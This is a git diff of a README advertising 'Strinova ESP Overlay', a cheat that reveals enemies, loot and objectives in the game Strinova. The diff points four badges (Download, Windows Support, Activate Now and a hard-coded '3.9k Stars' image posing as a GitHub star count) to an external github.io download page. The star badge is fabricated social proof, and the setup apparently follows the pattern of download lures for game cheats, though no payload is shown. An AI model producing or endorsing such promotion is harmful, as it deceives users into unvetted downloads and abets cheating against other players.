@@ -2,10 +2,10 @@
 
 In *Strinova*, survival isn’t just about damage—it’s about information. The **Strinova ESP Overlay tool** gives you real-time vision of enemies, loot, and objectives, ensuring you always know what’s happening around you. Whether navigating dungeons or clashing in PvP, this tool maximizes your situational awareness.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 3.9k Stars](https://img.shields.io/badge/GitHub-⭐️%203.9k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://strinova-esp-overlay.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://strinova-esp-overlay.github.io/.github/)
+[![⭐️ 3.9k Stars](https://img.shields.io/badge/GitHub-⭐️%203.9k%20Stars-black?style=for-the-badge\&logo=github)](https://strinova-esp-overlay.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://strinova-esp-overlay.github.io/.github/)
 
 ---
 
